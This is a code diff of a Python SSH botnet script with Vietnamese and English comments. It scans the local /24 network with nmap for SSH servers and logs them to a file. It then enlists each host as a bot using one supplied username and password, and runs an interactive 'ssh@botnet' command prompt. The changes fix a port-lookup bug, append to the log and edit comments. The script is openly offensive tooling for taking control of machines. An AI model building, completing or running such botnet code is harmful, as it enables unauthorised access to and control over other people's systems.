@@ -32,7 +32,7 @@ def get_arguments():
     return options
 
 
-def getSSHserver(myip):   # Tìm những host mở port 22
+def getSSHserver(myip):  # Tìm những host mở port 22
     nm = nmap.PortScanner()
     print("\n[*] Scanning network for ssh servers ...")
     nm.scan(hosts=myip + '/24')
@@ -46,9 +46,9 @@ def getSSHserver(myip):   # Tìm những host mở port 22
 
     ssh_server = {}  # i là host còn j là các cổng(port)
     for i in hosts:
-        openPorts = list(nm[i]['tcp'].keys())
+        openPorts = list(nm[i]['tcp'].keys())   # Return all ports have opened
         for j in openPorts:
-            if nm[i]['tcp']['name'] == 'ssh':  # Tìm xem hosts có mở port 22 hay không
+            if nm[i]['tcp'][j]['name'] == 'ssh':    # If this port is ssh
                 por = j
                 ssh_server[i] = j
                 break
@@ -58,7 +58,7 @@ def getSSHserver(myip):   # Tìm những host mở port 22
 
 def listSshServer(ssh_server):  # Ghi log những thông tin về host và port vào session.txt
     print("Running SSH Server: ")
-    f2 = open('session.txt', 'w')
+    f2 = open('session.txt', 'a')
 
     for i, j in ssh_server.items():
         print(f"Host: {i}\t\tPort: {j}\n")
@@ -81,7 +81,7 @@ def main():
     password = options.password
 
     myip = os.popen("ifconfig " + interface + " | grep \"inet \" | awk \'{print $2}\'").read().replace("\n", "")
-    ssh_servers = getSSHserver(myip)
+    ssh_servers = getSSHserver(myip)    # Find the hosts that opened port 22 and write them to session.txt
     listSshServer(ssh_servers)
 
     choice = input("Continue adding bots to the botnet?[Y/n] ")
@@ -94,7 +94,7 @@ def main():
         botnets.addBot(i, user, password, j)
 
     while True:
-        strr = colored('ssh@botnet:~$ ', 'red', None, ['bold'])
+        strr = colored('ssh@botnet:~$ ', 'red')
         cmd = input(strr)
 
         if cmd == "exit()" or cmd == "exit":
